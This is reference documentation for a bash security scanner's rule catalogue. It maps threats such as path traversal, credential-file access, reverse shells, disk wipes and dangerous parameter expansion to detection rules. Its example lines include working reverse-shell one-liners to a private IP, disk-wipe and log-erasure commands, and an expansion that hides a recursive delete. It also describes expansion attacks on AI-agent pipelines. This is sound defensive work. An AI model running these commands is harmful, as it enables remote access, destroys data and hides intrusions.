# Rules Catalogue (Threat → Rule → Example)

One page per shipped rule, plus a top-level mapping. This is the operational reference; [SECURITY.md](SECURITY.md) is the policy-level one.

## Mapping at a glance

| Threat                                              | Rule                    | Severity |
|-----------------------------------------------------|-------------------------|----------|
| Mass delete / recursive force                       | DangerousFlags          | high     |
| Path traversal (`../`)                              | PathTraversal           | high     |
| Introspective path (`/proc/self`, `/proc/$$`)       | PathTraversal           | medium   |
| Credential files (`/etc/shadow`, `~/.ssh/`, ...)    | SensitiveAccess         | high     |
| System DB files (`/etc/passwd`, `/etc/group`)       | SensitiveAccess         | medium   |
| `/dev/` access                                      | SensitiveAccess         | low      |
| Shared-library injection (`LD_PRELOAD`, DYLD*)      | EnvDangerousVars        | high     |
| Shell auto-exec (`BASH_ENV`, `ENV`)                 | EnvDangerousVars        | high     |
| `CDPATH` / `GIT_DIR` hijack                         | EnvDangerousVars        | low      |
| Word-splitting via unquoted `$VAR`                  | UnquotedExpansion       | medium   |
| Commands without absolute path / allowlist          | MissingAbsolutePath     | low      |
| Indirect / nested parameter expansion (CVE-2026-29783) | DangerousExpansion   | high     |
| Reverse-shell recipes                               | ReverseShellSink        | high/medium |
| Disk wipe / raw device write / destructive redirect | DangerousFilesystem     | high/medium |
| `IFS` overrides                                     | IFSManipulation         | high     |

## `PathTraversal`

`lib/Text/Treesitter/Bash/Security/Rule/PathTraversal.pm`

Detects path traversal sequences and introspective paths in argv.

| Pattern                  | Severity |
|--------------------------|----------|
| `../`, `/etc/../`, `/proc/../`, `/sys/../` | high |
| `/proc/self`, `/proc/$$`, `/sys/fs`       | medium |

Examples:

    cat /etc/../etc/shadow          -> high
    cat /proc/self/maps             -> medium
    cat /tmp/../tmp/foo             -> high (false positive risk on paths with `..` in names — acceptable for a security rule)

## `DangerousFlags`

`lib/Text/Treesitter/Bash/Security/Rule/DangerousFlags.pm`

Force + recursive flag combos on any command.

| Pattern                                       | Severity |
|-----------------------------------------------|----------|
| `-rf` / `-fr` anywhere in argv                | high |
| `-r` + `-f` anywhere in argv                  | high |
| `-R` + `-f` anywhere in argv                  | high |
| `--force` + `--recursive` (any order)         | high |
| `-r` or `-R` or `--recursive` alone           | medium |
| `-f` or `--force` alone                       | low |

Examples:

    rm -rf /tmp/x                    -> high
    rm --force --recursive /tmp/x    -> high
    rm -r /tmp/x                     -> medium
    rm -f /tmp/x                     -> low

## `SensitiveAccess`

`lib/Text/Treesitter/Bash/Security/Rule/SensitiveAccess.pm`

Filesystem paths that should not be touched without explicit user consent.

| Path                        | Severity |
|-----------------------------|----------|
| `/etc/shadow`               | high     |
| `/etc/sudoers`              | high     |
| `~/.ssh/`                   | high     |
| `~/.aws/`                   | high     |
| `~/.kube/`                  | high     |
| `/etc/passwd`               | medium   |
| `/etc/group`                | medium   |
| `/proc/self/`               | medium   |
| `/sys/fs/`                  | medium   |
| `/dev/`                     | low      |

## `EnvDangerousVars`

`lib/Text/Treesitter/Bash/Security/Rule/EnvDangerousVars.pm`

Sets or uses variables known to enable code execution or hijack process behaviour.

| Variable                       | Severity |
|--------------------------------|----------|
| `LD_PRELOAD`                   | high     |
| `LD_AUDIT`                     | high     |
| `DYLD_INSERT_LIBRARIES`        | high     |
| `DYLD_LIBRARY_PATH`            | high     |
| `BASH_ENV`                     | high     |
| `ENV`                          | high     |
| `CDPATH`                       | low      |
| `GIT_DIR`                      | low      |

## `UnquotedExpansion`

`lib/Text/Treesitter/Bash/Security/Rule/UnquotedExpansion.pm`

Unquoted `$VAR` followed by a path delimiter (`/`, `-`, `.`) is the classic
word-splitting + glob footgun.

    cat $HOME/.ssh/id_rsa       -> medium
    rm -rf $TMPDIR/cache        -> medium

False negatives are possible if the expansion is buried in complex quoting
(rule operates on raw source text).

## `MissingAbsolutePath`

`lib/Text/Treesitter/Bash/Security/Rule/MissingAbsolutePath.pm`

Commands invoked without `/`, `./`, `../`, and not in a curated allowlist of
common system binaries (`ls`, `cat`, `rm`, `cp`, `mv`, `find`, `grep`, `tar`,
`curl`, `wget`, `ssh`, `git`, `docker`, `perl`, `python`, `ruby`, `node`,
...). Severity: `low`.

    weirdtool foo bar            -> low
    /usr/bin/rm -rf /tmp/x       -> (not flagged)
    ./script.sh                  -> (not flagged)

## Adding a rule

See `.claude/skills/treesitter-bash-security/SKILL.md` for the contract,
patterns, and don'ts.

---

## Per-rule reference (newer rules)

### `DangerousExpansion`

`lib/Text/Treesitter/Bash/Security/Rule/DangerousExpansion.pm`

Detects parameter-expansion forms that have been exploited in
AI-agent bash pipelines. CVE-2026-29783 (GitHub Copilot CLI, CVSS 7.1)
is the canonical recent example.

| Pattern | Severity |
|---------|----------|
| `${!var}` — indirect variable expansion | high |
| `${var@P}`, `${var@Q}` — print/quote operator (eval-able output) | high |
| `${var=value}` — assignment-on-expansion | high |
| `${$()}` / `${${...}}` — command substitution nested in parameter | high |

Examples:

    echo "${!HOME}"           -> high
    eval "${PATH@P}"          -> high
    : "${X=$(rm -rf $HOME)}"  -> high

### `ReverseShellSink`

`lib/Text/Treesitter/Bash/Security/Rule/ReverseShellSink.pm`

| Pattern | Severity |
|---------|----------|
| `nc -e`, `ncat -e` | high |
| `socat exec:'...'` | high |
| `bash -i` / `sh -i` / `zsh -i` with `/dev/tcp/` redirect | high |
| `ssh -o ProxyCommand=...` | medium |
| `mkfifo` used to set up a pipe | medium |

Examples:

    nc -e /bin/sh 10.0.0.1 4444                              -> high
    socat exec:'bash -li',pty,stderr,setsid,sane tcp:...      -> high
    bash -i >& /dev/tcp/10.0.0.1/4444 0>&1                   -> high
    ssh -o ProxyCommand="nc %h %p" user@host                 -> medium

### `DangerousFilesystem`

`lib/Text/Treesitter/Bash/Security/Rule/DangerousFilesystem.pm`

| Pattern | Severity |
|---------|----------|
| `dd of=/dev/sdX`, `dd of=/dev/nvme0n1`, etc. | high |
| `mkfs`, `mkfs.ext4`, `mkfs.xfs`, ... | high |
| `fdisk`, `parted`, `gdisk`, `sfdisk`, `wipefs` | high |
| `: > /etc/...` — wipe via redirect | high |
| `truncate -s 0` of `/etc/`, `/var/log/`, `/boot/`, `/usr/` | high |
| `shred` | medium |
| `mount`, `umount` | medium |
| `losetup`, `cryptsetup` | medium |

Examples:

    dd if=/dev/zero of=/dev/sda           -> high
    mkfs.ext4 /dev/sdb1                   -> high
    : > /etc/passwd                       -> high
    truncate -s 0 /var/log/auth.log       -> high
    shred -u ~/.bash_history              -> medium
    mount -o bind /tmp /var/www           -> medium

### `IFSManipulation`

`lib/Text/Treesitter/Bash/Security/Rule/IFSManipulation.pm`

Detects `IFS=` assignments and `$IFS`-bound expansions. IFS overrides
are the classic trick used to evade shell-quoting-based audits.

| Pattern | Severity |
|---------|----------|
| `IFS=...`, `export IFS=...` | high |
| `$IFS` expansion followed by a delimiter character | medium |

Examples:

    IFS=$' \t\n' read -r line < file       -> high
    IFS=, read -d, -ra parts <<< "a,b,c"  -> high
    export IFS=; for x in $*              -> high

